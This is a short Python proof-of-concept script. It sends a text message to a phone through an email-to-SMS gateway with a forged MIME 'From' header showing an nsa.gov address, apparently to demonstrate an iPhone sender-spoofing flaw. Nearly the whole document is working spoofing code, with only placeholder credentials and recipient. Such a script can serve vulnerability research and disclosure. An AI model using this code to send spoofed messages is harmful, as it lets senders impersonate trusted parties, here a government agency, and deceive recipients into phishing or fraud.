#!/usr/bin/python3

import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

server = smtplib.SMTP('mail.example.com', port=587)
server.starttls()
server.login("testspoofiphone@example.com", "willgues_security_password")
msg = MIMEMultipart()
msg['From'] = "testspoofiphone@nsa.gov"

msg['To'] = "some-phone-number@tmomail.net"
msg['Subject'] = "Test Spoofed Message"

body = "Hello, this is a test of the iPhone MIME sub-header vulnerability. It allows spoofing of the sender by using a simple MIME sub header FROM address. This is distinct from Email spoofing, as the SMTP headers are all valid..... Sometimes it works and sometimes it doesnt"

msg.attach(MIMEText(body, 'plain'))
text = msg.as_string()

server.sendmail("testspoofiphone@example.com", "some-phone-number@tmomail.net", text)
